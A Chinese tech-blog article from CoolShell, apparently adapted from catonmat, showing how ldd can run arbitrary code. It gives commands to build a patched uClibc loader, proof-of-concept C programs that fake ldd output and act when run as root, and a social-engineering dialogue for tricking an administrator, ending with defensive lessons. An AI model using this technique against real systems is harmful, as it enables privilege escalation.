{
  "Source": "coolshell.cn",
  "Title": "ldd 的一个安全问题",
  "Link": "https://coolshell.cn/articles/1626.html",
  "Content": "\u003cdiv class=\"entry-content\"\u003e\n\u003cp\u003e\u003cscript async=\"\" src=\"https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-3415450859608158\" crossorigin=\"anonymous\" type=\"48f6f85b3aeb18662b4d4f8f-text/javascript\"\u003e\u003c/script\u003e我们知道“ldd”这个命令主要是被程序员或是管理员用来查看可执行文件所依赖的动态链接库的。是的，这就是这个命令的用处。可是，这个命令比你想像的要危险得多，也许很多黑客通过ldd的安全问题来攻击你的服务器。其实，ldd的安全问题存在很长的时间了，但居然没有被官方文档所记录来下，这听上去更加难以理解了。怎么？是不是听起来有点不可思议？下面，让我为你细细道来。\u003c/p\u003e\n\u003cp\u003e首先，我们先来了解一下，我们怎么来使用ldd的，请你看一下下面的几个命令：\u003c/p\u003e\n\u003cpre data-enlighter-language=\"shell\" class=\"EnlighterJSRAW\"\u003e(1) $ ldd /bin/grep\n        linux-gate.so.1 =\u0026gt;  (0xffffe000)\n        libc.so.6 =\u0026gt; /lib/libc.so.6 (0xb7eca000)\n        /lib/ld-linux.so.2 (0xb801e000)\n\n(2) $ LD_TRACE_LOADED_OBJECTS=1 /bin/grep\n        linux-gate.so.1 =\u0026gt;  (0xffffe000)\n        libc.so.6 =\u0026gt; /lib/libc.so.6 (0xb7e30000)\n        /lib/ld-linux.so.2 (0xb7f84000)\n\n(3) $ LD_TRACE_LOADED_OBJECTS=1 /lib/ld-linux.so.2 /bin/grep\n        linux-gate.so.1 =\u0026gt;  (0xffffe000)\n        libc.so.6 =\u0026gt; /lib/libc.so.6 (0xb7f7c000)\n        /lib/ld-linux.so.2 (0xb80d0000)\u003c/pre\u003e\n\u003cp\u003e第(1)个命令，我们运行了 \u003ccode data-enlighter-language=\"raw\" class=\"EnlighterJSRAW\"\u003eldd\u003c/code\u003e 于 \u003ccode data-enlighter-language=\"raw\" class=\"EnlighterJSRAW\"\u003e/bin/grep\u003c/code\u003e。我们可以看到命令的输出是我们想要的，那就是 \u003ccode data-enlighter-language=\"raw\" class=\"EnlighterJSRAW\"\u003e/bin/grep\u003c/code\u003e 所依赖的动态链接库。\u003c/p\u003e\n\u003cp\u003e第(2)个命令设置了一个叫 LD_TRACE_LOADED_OBJECTS 的环境变量，然后就好像在运行命令 \u003ccode data-enlighter-language=\"raw\" class=\"EnlighterJSRAW\"\u003e/bin/grep\u003c/code\u003e (但其实并不是)。 其运行结果和ldd的输出是一样的！\u003c/p\u003e\n\u003cp\u003e第(3)个命令也是设置了环境变量 LD_TRACE_LOADED_OBJECTS ，然后调用了动态链接库 \u003ccode data-enlighter-language=\"raw\" class=\"EnlighterJSRAW\"\u003eld-linux.so\u003c/code\u003e 并把 \u003ccode data-enlighter-language=\"raw\" class=\"EnlighterJSRAW\"\u003e/bin/grep\u003c/code\u003e 作为参数传给它。我们发现，其输出结果还是和前面两个一样的。\u003c/p\u003e\n\u003cp\u003e\u003cspan id=\"more-1626\"\u003e\u003c/span\u003e\u003c/p\u003e\n\u003cdiv id=\"ez-toc-container\" class=\"ez-toc-v2_0_48 counter-hierarchy ez-toc-counter ez-toc-grey ez-toc-container-direction\"\u003e\n\u003cdiv class=\"ez-toc-title-container\"\u003e\n\u003cp class=\"ez-toc-title\"\u003e目录\u003c/p\u003e\n\u003cspan class=\"ez-toc-title-toggle\"\u003e\u003c/span\u003e\u003c/div\u003e\n\u003cnav\u003e\u003cul class=\"ez-toc-list ez-toc-list-level-1 \"\u003e\u003cli class=\"ez-toc-page-1 ez-toc-heading-level-4\"\u003e\u003ca class=\"ez-toc-link ez-toc-heading-1\" href=\"#%E5%85%B7%E4%BD%93%E5%8F%91%E7%94%9F%E4%BA%86%E4%BB%80%E4%B9%88%EF%BC%9F\" title=\"具体发生了什么？\"\u003e具体发生了什么？\u003c/a\u003e\u003c/li\u003e\u003cli class=\"ez-toc-page-1 ez-toc-heading-level-4\"\u003e\u003ca class=\"ez-toc-link ez-toc-heading-2\" href=\"#%E7%BC%96%E8%AF%91%E4%B8%80%E4%B8%AA%E6%96%B0%E7%9A%84%E8%A3%85%E8%BD%BD%E5%99%A8\" title=\"编译一个新的装载器\"\u003e编译一个新的装载器\u003c/a\u003e\u003c/li\u003e\u003cli class=\"ez-toc-page-1 ez-toc-heading-level-4\"\u003e\u003ca class=\"ez-toc-link ez-toc-heading-3\" href=\"#%E5%B0%8F%E8%AF%95_%E7%89%9B%E5%88%80\" title=\"小试 牛刀\"\u003e小试 牛刀\u003c/a\u003e\u003c/li\u003e\u003cli class=\"ez-toc-page-1 ez-toc-heading-level-4\"\u003e\u003ca class=\"ez-toc-link ez-toc-heading-4\" href=\"#%E9%82%AA%E6%81%B6%E7%9A%84%E7%A8%8B%E5%BA%8F\" title=\"邪恶的程序\"\u003e邪恶的程序\u003c/a\u003e\u003c/li\u003e\u003cli class=\"ez-toc-page-1 ez-toc-heading-level-4\"\u003e\u003ca class=\"ez-toc-link ez-toc-heading-5\" href=\"#%E9%82%AA%E6%81%B6%E7%9A%84%E7%94%B5%E8%AF%9D\" title=\"邪恶的电话\"\u003e邪恶的电话\u003c/a\u003e\u003c/li\u003e\u003c/ul\u003e\u003c/nav\u003e\u003c/div\u003e\n\u003ch4\u003e\u003cspan class=\"ez-toc-section\" id=\"%E5%85%B7%E4%BD%93%E5%8F%91%E7%94%9F%E4%BA%86%E4%BB%80%E4%B9%88%EF%BC%9F\"\u003e\u003c/span\u003e具体发生了什么？\u003cspan class=\"ez-toc-section-end\"\u003e\u003c/span\u003e\u003c/h4\u003e\n\u003cp\u003e对于第二个和第三个命令来说，好像是对 \u003ccode data-enlighter-language=\"raw\" class=\"EnlighterJSRAW\"\u003eldd\u003c/code\u003e 的一个包装或是一个隐式调用。对于第二个和第三个命令来说， \u003ccode data-enlighter-language=\"raw\" class=\"EnlighterJSRAW\"\u003e/bin/grep\u003c/code\u003e 这个命令就根本没有被运行。这是一个GNU动态载入器的怪异的特性。如果其注意到环境变量LD_TRACE_LOADED_OBJECTS 被设置了，那么它就不会去执行那个可运行的程序，而去输出这个可执行程序所依赖的动态链接库 （在BSD 系统上的\u003ccode data-enlighter-language=\"raw\" class=\"EnlighterJSRAW\"\u003eldd\u003c/code\u003e 是一个C 程序)。\u003c/p\u003e\n\u003cp\u003e如果你使用的是Linux，那么，你可以去看看 \u003ccode data-enlighter-language=\"raw\" class=\"EnlighterJSRAW\"\u003eldd\u003c/code\u003e 程序，你会发现这是一个 bash 的脚本。如果你仔细查看这个脚本的源码，你会发现，第二个命令和第三个命令的差别就在于 \u003ccode data-enlighter-language=\"raw\" class=\"EnlighterJSRAW\"\u003eld-linux.so\u003c/code\u003e 装载器是否可以被\u003ccode data-enlighter-language=\"raw\" class=\"EnlighterJSRAW\"\u003eldd\u003c/code\u003e所装载，如果不能，那就是第二个命令，如果而的话，那就是第三个命令。\u003c/p\u003e\n\u003cp\u003e所以，如果我们可以让\u003ccode data-enlighter-language=\"raw\" class=\"EnlighterJSRAW\"\u003eld-linux.so\u003c/code\u003e 装载器失效的话，或是让别的装载器来取代这个系统默认的动态链接库的话，那么我们就可以让 \u003ccode data-enlighter-language=\"raw\" class=\"EnlighterJSRAW\"\u003eldd\u003c/code\u003e来载入并运行我们想要程序了——使用不同的载装器并且不处理LD_TRACE_LOADED_OBJECTS 环境变量，而是直接运行程序。\u003c/p\u003e\n\u003cp\u003e例如，你可以创建一个具有恶意的程序，如： ~/app/bin/exec 并且使用他自己的装载器 ~/app/lib/loader.so。如果某人（比如超级用户root） 运行了 \u003ccode data-enlighter-language=\"raw\" class=\"EnlighterJSRAW\"\u003eldd /home/you/app/bin/exec\u003c/code\u003e ，于是，他就玩完了。因为，那并不会列出所依赖的动态链接库，而是，直接执行你的那个恶意程序，这相当于，那个用户给了你他的授权。\u003c/p\u003e\n\u003ch4\u003e\u003cspan class=\"ez-toc-section\" id=\"%E7%BC%96%E8%AF%91%E4%B8%80%E4%B8%AA%E6%96%B0%E7%9A%84%E8%A3%85%E8%BD%BD%E5%99%A8\"\u003e\u003c/span\u003e编译一个新的装载器\u003cspan class=\"ez-toc-section-end\"\u003e\u003c/span\u003e\u003c/h4\u003e\n\u003cp\u003e下载 \u003ca href=\"http://www.uclibc.org/\"\u003euClibc\u003c/a\u003e C库。这是一个相当漂亮的代码，并且可以非常容易地修改一下源代码，使其忽略LD_TRACE_LOADED_OBJECTS 检查。\u003c/p\u003e\n\u003cpre data-enlighter-language=\"shell\" class=\"EnlighterJSRAW\"\u003e$ mkdir app\n$ cd app\napp$ wget \u0026#39;http://www.uclibc.org/downloads/uClibc-0.9.30.1.tar.bz2\u0026#39;\u003c/pre\u003e\n\u003cp\u003e解压这个包，并执行 \u003ccode data-enlighter-language=\"raw\" class=\"EnlighterJSRAW\"\u003emake menuconfig\u003c/code\u003e，选项你的平台架构（比如：i386），剩下的事情保持不变。\u003c/p\u003e\n\u003cpre data-enlighter-language=\"shell\" class=\"EnlighterJSRAW\"\u003e$ bunzip2 \u0026lt; uClibc-0.9.30.1.tar.bz2 | tar -vx\n$ rm -rf uClibc-0.9.30.1.tar.bz2\n$ cd uClibc-0.9.30.1\n$ make menuconfig\u003c/pre\u003e\n\u003cp\u003e编辑 .config 并设置目标安装目录：到 \u003ccode data-enlighter-language=\"raw\" class=\"EnlighterJSRAW\"\u003e/home/you/app/uclibc\u003c/code\u003e，\u003cbr/\u003e\n把下面两行\u003c/p\u003e\n\u003cpre data-enlighter-language=\"shell\" class=\"EnlighterJSRAW\"\u003eRUNTIME_PREFIX=\u0026#34;/usr/$(TARGET_ARCH)-linux-uclibc/\u0026#34;\nDEVEL_PREFIX=\u0026#34;/usr/$(TARGET_ARCH)-linux-uclibc/usr/\u0026#34;\u003c/pre\u003e\n\u003cp\u003e改成\u003c/p\u003e\n\u003cpre data-enlighter-language=\"shell\" class=\"EnlighterJSRAW\"\u003eRUNTIME_PREFIX=\u0026#34;/home/you/app/uclibc/\u0026#34;\nDEVEL_PREFIX=\u0026#34;/home/you/app/uclibc/usr/\u0026#34;\u003c/pre\u003e\n\u003cp\u003e现在你需要改动一下其源代码，让其忽略LD_TRACE_LOADED_OBJECTS 环境变量的检查。 下面是个这修改的diff，你需要修改的是 \u003ccode data-enlighter-language=\"raw\" class=\"EnlighterJSRAW\"\u003eldso/ldso/ldso.c\u003c/code\u003e 文件。你可把下面的这个diff存成一个叫file的文件，然后运行这个命令：\u003ccode data-enlighter-language=\"raw\" class=\"EnlighterJSRAW\"\u003epatch -p0 \u0026lt; file\u003c/code\u003e。如果你不这样做的话，那么，我们的黑客程序就无法工作，而我们的这个装载器还是会认为 \u003ccode data-enlighter-language=\"raw\" class=\"EnlighterJSRAW\"\u003eldd\u003c/code\u003e 想列出动态链接库的文件列表。\u003c/p\u003e\n\u003cp\u003e[patch]\u003cbr/\u003e\n— ldso/ldso/ldso-orig.c 2009-10-25 00:27:12.000000000 +0300\u003cbr/\u003e\n+++ ldso/ldso/ldso.c 2009-10-25 00:27:22.000000000 +0300\u003cbr/\u003e\n@@ -404,9 +404,11 @@\u003cbr/\u003e\n} #endif\u003cbr/\u003e\n+ /*\u003cbr/\u003e\nif (_dl_getenv(\u0026#34;LD_TRACE_LOADED_OBJECTS\u0026#34;, envp) != NULL) {\u003cbr/\u003e\ntrace_loaded_objects++;\u003cbr/\u003e\n}\u003cbr/\u003e\n+ */\u003cbr/\u003e\n#ifndef __LDSO_LDD_SUPPORT__\u003cbr/\u003e\nif (trace_loaded_objects) {\u003cbr/\u003e\n[/patch]\u003c/p\u003e\n\u003cp\u003e下面让我们来编译并安装它。\u003c/p\u003e\n\u003cpre data-enlighter-language=\"shell\" class=\"EnlighterJSRAW\"\u003e$ make -j 4\n$ make install\u003c/pre\u003e\n\u003cp\u003e于是，我们的 uClibc 装载器就被安装了，并且libc 库指向了 /home/you/app/uclibc. 就这么简单，现在，我们需要做的就是把我们的uClibc的装载器 (app/lib/ld-uClibc.so.0)变成默认的。\u003c/p\u003e\n\u003ch4\u003e\u003cspan class=\"ez-toc-section\" id=\"%E5%B0%8F%E8%AF%95_%E7%89%9B%E5%88%80\"\u003e\u003c/span\u003e小试 牛刀\u003cspan class=\"ez-toc-section-end\"\u003e\u003c/span\u003e\u003c/h4\u003e\n\u003cp\u003e首先，先让我们来创建一个测试程序，这人程序也就是输出些自己的东西，这样可以让我们看到我们的程序被执行了。我们把这个程序放在 \u003ccode data-enlighter-language=\"raw\" class=\"EnlighterJSRAW\"\u003eapp/bin/\u003c/code\u003e下，叫“myapp.c”，下面是源代码\u003c/p\u003e\n\u003cpre data-enlighter-language=\"c\" class=\"EnlighterJSRAW\"\u003e#include \u0026lt;stdio.h\u0026gt;\n#include \u0026lt;stdlib.h\u0026gt;\n\nint main() {\n  if (getenv(\u0026#34;LD_TRACE_LOADED_OBJECTS\u0026#34;)) {\n    printf(\u0026#34;All your things are belong to me.\\n\u0026#34;);\n  }\n  else {\n    printf(\u0026#34;Nothing.\\n\u0026#34;);\n  }\n  return 0;\n}\u003c/pre\u003e\n\u003cp\u003e这是一个很简单的代码了，这段代码主要检查一下环境变量LD_TRACE_LOADED_OBJECTS 是否被设置了，如果是，那么恶意程序执行，如果没有，那么程序什么也不发生。\u003c/p\u003e\n\u003cp\u003e下面是编译程序的命令，，大家可以看到，我们静态链接了一些函数库。我们并不想让LD_LIBRARY_PATH这个变量来发挥作用。\u003c/p\u003e\n\u003cpre data-enlighter-language=\"shell\" class=\"EnlighterJSRAW\"\u003e$ L=/home/you/app/uclibc\n$ gcc -Wl,--dynamic-linker,$L/lib/ld-uClibc.so.0 \\\n    -Wl,-rpath-link,$L/lib \\\n    -nostdlib \\\n    myapp.c -o myapp \\\n    $L/usr/lib/crt*.o \\\n    -L$L/usr/lib/ \\\n    -lc\u003c/pre\u003e\n\u003cp\u003e下面是GCC的各个参数的解释：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003e-Wl,–dynamic-linker,$L/lib/ld-uClibc.so.0\u003c/strong\u003e — 指定一个新的装载器。\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e-Wl,-rpath-link,$L/lib\u003c/strong\u003e — 指定一个首要的动态装载器所在的目录，这个目录用于查找动态库。\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e-nostdlib\u003c/strong\u003e — 不使用系统标准库。\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003emyapp.c -o myapp\u003c/strong\u003e — 编译myapp.c 成可执行文件 myapp,\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e$L/usr/lib/crt*.o\u003c/strong\u003e — 静态链接runtime 代码\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e-L$L/usr/lib/\u003c/strong\u003e — libc 的目录（静态链接）\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e-lc\u003c/strong\u003e —  C 库\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e现在让我们来运行一下我们的 \u003ccode data-enlighter-language=\"raw\" class=\"EnlighterJSRAW\"\u003emyapp\u003c/code\u003e （没有ldd，一切正常）\u003c/p\u003e\n\u003cpre data-enlighter-language=\"shell\" class=\"EnlighterJSRAW\"\u003eapp/bin$ ./myapp\nNothing.\u003c/pre\u003e\n\u003cp\u003eLD_TRACE_LOADED_OBJECTS 没有设置，所以输出 “Nothing” 。\u003c/p\u003e\n\u003cp\u003e现在，让我们来使用 \u003ccode data-enlighter-language=\"raw\" class=\"EnlighterJSRAW\"\u003eldd\u003c/code\u003e 来看看这个程序的最大的影响力，让我们以root身份来干这个事。\u003c/p\u003e\n\u003cpre data-enlighter-language=\"shell\" class=\"EnlighterJSRAW\"\u003e$ su\nPassword:\n# ldd ./myapp\nAll your things are belong to me.\u003c/pre\u003e\n\u003cp\u003e哈哈，我们可以看到，ldd触发了我们的恶意代码。于是，我们偷了整个系统！\u003c/p\u003e\n\u003ch4\u003e\u003cspan class=\"ez-toc-section\" id=\"%E9%82%AA%E6%81%B6%E7%9A%84%E7%A8%8B%E5%BA%8F\"\u003e\u003c/span\u003e邪恶的程序\u003cspan class=\"ez-toc-section-end\"\u003e\u003c/span\u003e\u003c/h4\u003e\n\u003cp\u003e下面这个例子更为实际一些，如果没有\u003ccode data-enlighter-language=\"raw\" class=\"EnlighterJSRAW\"\u003eldd\u003c/code\u003e ，那程序程序会报错 “error while loading shared libraries” ，这个错误信息会引诱你去去使用 \u003ccode data-enlighter-language=\"raw\" class=\"EnlighterJSRAW\"\u003eldd\u003c/code\u003e 去做检查，如果你是root的话，那么就整个系统就玩完了。而当你可以了 \u003ccode data-enlighter-language=\"raw\" class=\"EnlighterJSRAW\"\u003eldd\u003c/code\u003e 后，它会在干完坏事后，模仿正确的\u003ccode data-enlighter-language=\"raw\" class=\"EnlighterJSRAW\"\u003eldd\u003c/code\u003e的输出，告诉你 \u003ccode data-enlighter-language=\"raw\" class=\"EnlighterJSRAW\"\u003elibat.so.0\u003c/code\u003e 不存在。\u003c/p\u003e\n\u003cp\u003e下面的代码仅仅是向你展示了一下整个想法，代码还需加工和改善。\u003c/p\u003e\n\u003cpre data-enlighter-language=\"c\" class=\"EnlighterJSRAW\"\u003e#include \u0026lt;stdio.h\u0026gt;\n#include \u0026lt;stdlib.h\u0026gt;\n#include \u0026lt;unistd.h\u0026gt;\n#include \u0026lt;sys/types.h\u0026gt;\n\n/*\nThis example pretends to have a fictitious library \u0026#39;libat.so.0\u0026#39; missing.\nWhen someone with root permissions runs `ldd this_program`, it does\nsomething nasty in malicious() function.\n\nI haven\u0026#39;t implemented anything malicious but have written down some ideas\nof what could be done.\n\nThis is, of course, a joke program. To make it look more real, you\u0026#39;d have\nto bump its size, add some more dependencies, simulate trying to open the\nmissing library, detect if ran under debugger or strace and do absolutely\nnothing suspicious, etc.\n*/\n\nvoid pretend_as_ldd()\n{\n    printf(\u0026#34;\\tlinux-gate.so.1 =\u0026gt;  (0xffffe000)\\n\u0026#34;);\n    printf(\u0026#34;\\tlibat.so.0 =\u0026gt; not found\\n\u0026#34;);\n    printf(\u0026#34;\\tlibc.so.6 =\u0026gt; /lib/libc.so.6 (0xb7ec3000)\\n\u0026#34;);\n    printf(\u0026#34;\\t/lib/ld-linux.so.2 (0xb8017000)\\n\u0026#34;);\n}\n\nvoid malicious()\n{\n    if (geteuid() == 0) {\n        /* we are root ... */\n        printf(\u0026#34;poof, all your box are belong to us\\n\u0026#34;);\n\n        /* silently add a new user to /etc/passwd, */\n        /* or create a suid=0 program that you can later execute, */\n        /* or do something really nasty */\n    }\n}\n\nint main(int argc, char **argv)\n{\n    if (getenv(\u0026#34;LD_TRACE_LOADED_OBJECTS\u0026#34;)) {\n        malicious();\n        pretend_as_ldd();\n        return 0;\n    }\n\n    printf(\u0026#34;%s: error while loading shared libraries: libat.so.0: \u0026#34;\n           \u0026#34;cannot open shared object file: No such file or directory\\n\u0026#34;,\n           argv[0]);\n    return 127;\n}\u003c/pre\u003e\n\u003cp\u003e \u003c/p\u003e\n\u003ch4\u003e\u003cspan class=\"ez-toc-section\" id=\"%E9%82%AA%E6%81%B6%E7%9A%84%E7%94%B5%E8%AF%9D\"\u003e\u003c/span\u003e邪恶的电话\u003cspan class=\"ez-toc-section-end\"\u003e\u003c/span\u003e\u003c/h4\u003e\n\u003cp\u003e事实上来说，上面的那段程序可能的影响更具破坏性，因为大多数的系统管理员可能并不知道不能使用 \u003ccode data-enlighter-language=\"raw\" class=\"EnlighterJSRAW\"\u003eldd\u003c/code\u003e 去测试那些不熟悉的执行文件。下面是一段很可能会发现的对话，让我们看看我们的程序是如何更快地获得系统管理员的权限的。\u003c/p\u003e\n\u003cp\u003e系统管理员的电话狂响……\u003c/p\u003e\n\u003cp\u003e系统管理员： “同志你好，我是系统管理员，有什么可以帮你的？”\u003c/p\u003e\n\u003cp\u003e黑客：“管理员同志你好。我有一个程序不能运行，总是报错，错误好像是说一个系统动态链接库有问题，你能不能帮我看看？”\u003c/p\u003e\n\u003cp\u003e系统管理员：“没问题，你的那个程序在哪里？”\u003c/p\u003e\n\u003cp\u003e黑客： “在我的home目录下，/home/hchen/app/bin/myapp”。\u003c/p\u003e\n\u003cp\u003e系统管理员：“ OK，等一会儿”，黑客在电话这头可以听到一些键盘的敲击声。\u003c/p\u003e\n\u003cp\u003e系统管理员：“好像是动态链接库的问题，你能告诉我你的程序具体需要什么样的动态链接库吗？”\u003c/p\u003e\n\u003cp\u003e黑客说: “谢谢，应该没有别的嘛。”\u003c/p\u003e\n\u003cp\u003e系统管理员：“嗯，查到了，说是没有了 \u003ccode data-enlighter-language=\"raw\" class=\"EnlighterJSRAW\"\u003elibat.so.0\u003c/code\u003e这是你自己的动态链接库吗？”\u003c/p\u003e\n\u003cp\u003e黑客说：“哦，好像是的，你等一下，我看看……” 黑客在那头露出了邪恶的笑，并且，讯速地输入了下面的命令：\u003c/p\u003e\n\u003cp style=\"padding-left: 30px;\"\u003e\u003ccode data-enlighter-language=\"raw\" class=\"EnlighterJSRAW\"\u003emv ~/.hidden/working_app ~/app/bin/myapp\u003c/code\u003e\u003cbr/\u003e\n\u003ccode data-enlighter-language=\"raw\" class=\"EnlighterJSRAW\"\u003emv ~/.hidden/libat.so.o ~/app/bin/\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e黑客说：“哦，对了，的确是我的不对，我忘了把这个链接库拷过来了，现在应该可以了，谢谢你啊，真是不好意思，麻烦你了”\u003c/p\u003e\n\u003cp\u003e系统管理员： “没事就行了，下次注意啊！”（然后系统管理心里暗骂，TMD，又一个白痴用户！……）\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e教训一：千万不要使用 \u003ccode data-enlighter-language=\"raw\" class=\"EnlighterJSRAW\"\u003eldd\u003c/code\u003e 去测试你不知道的文件！\u003cbr/\u003e\n教训二：千万不要相信陌生人！\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e文章：\u003ca href=\"http://www.catonmat.net/blog/ldd-arbitrary-code-execution/\" target=\"_blank\"\u003e来源\u003c/a\u003e（以上文章并非完全翻译，我做过一些修改，所以，如果你要转载，请注明作者和出处）\u003c/p\u003e\n\u003cdiv style=\"margin-top: 15px; font-size: 16px;color: #cc0000;\"\u003e\n\u003cp align=\"center\"\u003e\u003cstrong\u003e（转载本站文章请注明作者和出处 \u003ca href=\"https://coolshell.cn/\"\u003e酷 壳 – CoolShell\u003c/a\u003e ，请勿用于任何商业用途）\u003c/strong\u003e\u003c/p\u003e\n\u003c/div\u003e\n\u003cdiv class=\"wp_rp_wrap  wp_rp_vertical_m\" id=\"wp_rp_first\"\u003e\u003cdiv class=\"wp_rp_content\"\u003e\u003ch3 class=\"related_post_title\"\u003e相关文章\u003c/h3\u003e\u003cul class=\"related_post wp_rp\"\u003e\u003cli\u003e\u003ca href=\"https://coolshell.cn/articles/22320.html\" class=\"wp_rp_thumbnail\"\u003e\u003cimg src=\"https://coolshell.cn/wp-content/uploads/2022/12/eBPF-150x150.jpeg\" alt=\"eBPF 介绍\" width=\"150\" height=\"150\"/\u003e\u003c/a\u003e\u003ca href=\"https://coolshell.cn/articles/22320.html\" class=\"wp_rp_title\"\u003eeBPF 介绍\u003c/a\u003e\u003c/li\u003e\u003cli\u003e\u003ca href=\"https://coolshell.cn/articles/19219.html\" class=\"wp_rp_thumbnail\"\u003e\u003cimg src=\"https://coolshell.cn/wp-content/uploads/2019/03/linux.ninja_-150x150.png\" alt=\"打造高效的工作环境 – Shell 篇\" width=\"150\" height=\"150\"/\u003e\u003c/a\u003e\u003ca href=\"https://coolshell.cn/articles/19219.html\" class=\"wp_rp_title\"\u003e打造高效的工作环境 – Shell 篇\u003c/a\u003e\u003c/li\u003e\u003cli\u003e\u003ca href=\"https://coolshell.cn/articles/18654.html\" class=\"wp_rp_thumbnail\"\u003e\u003cimg src=\"https://coolshell.cn/wp-content/uploads/2018/12/docker-networking-1-150x150.png\" alt=\"记一次Kubernetes/Docker网络排障\" width=\"150\" height=\"150\"/\u003e\u003c/a\u003e\u003ca href=\"https://coolshell.cn/articles/18654.html\" class=\"wp_rp_title\"\u003e记一次Kubernetes/Docker网络排障\u003c/a\u003e\u003c/li\u003e\u003cli\u003e\u003ca href=\"https://coolshell.cn/articles/18360.html\" class=\"wp_rp_thumbnail\"\u003e\u003cimg src=\"https://coolshell.cn/wp-content/uploads/2018/05/300x262-150x150.jpg\" alt=\"程序员练级攻略（2018)  与我的专栏\" width=\"150\" height=\"150\"/\u003e\u003c/a\u003e\u003ca href=\"https://coolshell.cn/articles/18360.html\" class=\"wp_rp_title\"\u003e程序员练级攻略（2018) 与我的专栏\u003c/a\u003e\u003c/li\u003e\u003cli\u003e\u003ca href=\"https://coolshell.cn/articles/17998.html\" class=\"wp_rp_thumbnail\"\u003e\u003cimg src=\"https://coolshell.cn/wp-content/uploads/2017/07/systemd-1-150x150.jpeg\" alt=\"Linux PID 1 和 Systemd\" width=\"150\" height=\"150\"/\u003e\u003c/a\u003e\u003ca href=\"https://coolshell.cn/articles/17998.html\" class=\"wp_rp_title\"\u003eLinux PID 1 和 Systemd\u003c/a\u003e\u003c/li\u003e\u003cli\u003e\u003ca href=\"https://coolshell.cn/articles/17416.html\" class=\"wp_rp_thumbnail\"\u003e\u003cimg src=\"https://coolshell.cn/wp-content/uploads/2016/07/cache-150x150.png\" alt=\"缓存更新的套路\" width=\"150\" height=\"150\"/\u003e\u003c/a\u003e\u003ca href=\"https://coolshell.cn/articles/17416.html\" class=\"wp_rp_title\"\u003e缓存更新的套路\u003c/a\u003e\u003c/li\u003e\u003c/ul\u003e\u003c/div\u003e\u003c/div\u003e\n\u003cdiv id=\"post-ratings-1626\" class=\"post-ratings\" itemscope=\"\" itemtype=\"https://schema.org/Article\" data-nonce=\"ed29824e24\"\u003e\u003cimg id=\"rating_1626_1\" src=\"https://coolshell.cn/wp-content/plugins/wp-postratings/images/stars_crystal/rating_on.gif\" alt=\"好烂啊\" title=\"好烂啊\" onmouseover=\"if (!window.__cfRLUnblockHandlers) return false; current_rating(1626, 1, \u0026#39;好烂啊\u0026#39;);\" onmouseout=\"if (!window.__cfRLUnblockHandlers) return false; ratings_off(3.3, 4, 0);\" onclick=\"if (!window.__cfRLUnblockHandlers) return false; rate_post();\" onkeypress=\"if (!window.__cfRLUnblockHandlers) return false; rate_post();\" style=\"cursor: pointer; border: 0px;\" data-cf-modified-48f6f85b3aeb18662b4d4f8f-=\"\"/\u003e\u003cimg id=\"rating_1626_2\" src=\"https://coolshell.cn/wp-content/plugins/wp-postratings/images/stars_crystal/rating_on.gif\" alt=\"有点差\" title=\"有点差\" onmouseover=\"if (!window.__cfRLUnblockHandlers) return false; current_rating(1626, 2, \u0026#39;有点差\u0026#39;);\" onmouseout=\"if (!window.__cfRLUnblockHandlers) return false; ratings_off(3.3, 4, 0);\" onclick=\"if (!window.__cfRLUnblockHandlers) return false; rate_post();\" onkeypress=\"if (!window.__cfRLUnblockHandlers) return false; rate_post();\" style=\"cursor: pointer; border: 0px;\" data-cf-modified-48f6f85b3aeb18662b4d4f8f-=\"\"/\u003e\u003cimg id=\"rating_1626_3\" src=\"https://coolshell.cn/wp-content/plugins/wp-postratings/images/stars_crystal/rating_on.gif\" alt=\"凑合看看\" title=\"凑合看看\" onmouseover=\"if (!window.__cfRLUnblockHandlers) return false; current_rating(1626, 3, \u0026#39;凑合看看\u0026#39;);\" onmouseout=\"if (!window.__cfRLUnblockHandlers) return false; ratings_off(3.3, 4, 0);\" onclick=\"if (!window.__cfRLUnblockHandlers) return false; rate_post();\" onkeypress=\"if (!window.__cfRLUnblockHandlers) return false; rate_post();\" style=\"cursor: pointer; border: 0px;\" data-cf-modified-48f6f85b3aeb18662b4d4f8f-=\"\"/\u003e\u003cimg id=\"rating_1626_4\" src=\"https://coolshell.cn/wp-content/plugins/wp-postratings/images/stars_crystal/rating_half.gif\" alt=\"还不错\" title=\"还不错\" onmouseover=\"if (!window.__cfRLUnblockHandlers) return false; current_rating(1626, 4, \u0026#39;还不错\u0026#39;);\" onmouseout=\"if (!window.__cfRLUnblockHandlers) return false; ratings_off(3.3, 4, 0);\" onclick=\"if (!window.__cfRLUnblockHandlers) return false; rate_post();\" onkeypress=\"if (!window.__cfRLUnblockHandlers) return false; rate_post();\" style=\"cursor: pointer; border: 0px;\" data-cf-modified-48f6f85b3aeb18662b4d4f8f-=\"\"/\u003e\u003cimg id=\"rating_1626_5\" src=\"https://coolshell.cn/wp-content/plugins/wp-postratings/images/stars_crystal/rating_off.gif\" alt=\"很精彩\" title=\"很精彩\" onmouseover=\"if (!window.__cfRLUnblockHandlers) return false; current_rating(1626, 5, \u0026#39;很精彩\u0026#39;);\" onmouseout=\"if (!window.__cfRLUnblockHandlers) return false; ratings_off(3.3, 4, 0);\" onclick=\"if (!window.__cfRLUnblockHandlers) return false; rate_post();\" onkeypress=\"if (!window.__cfRLUnblockHandlers) return false; rate_post();\" style=\"cursor: pointer; border: 0px;\" data-cf-modified-48f6f85b3aeb18662b4d4f8f-=\"\"/\u003e (\u003cstrong\u003e12\u003c/strong\u003e 人打了分，平均分： \u003cstrong\u003e3.25\u003c/strong\u003e )\u003cbr/\u003e\u003cspan class=\"post-ratings-text\" id=\"ratings_1626_text\"\u003e\u003c/span\u003e\u003cmeta itemprop=\"name\" content=\"ldd 的一个安全问题\"/\u003e\u003cmeta itemprop=\"headline\" content=\"ldd 的一个安全问题\"/\u003e\u003cmeta itemprop=\"description\" 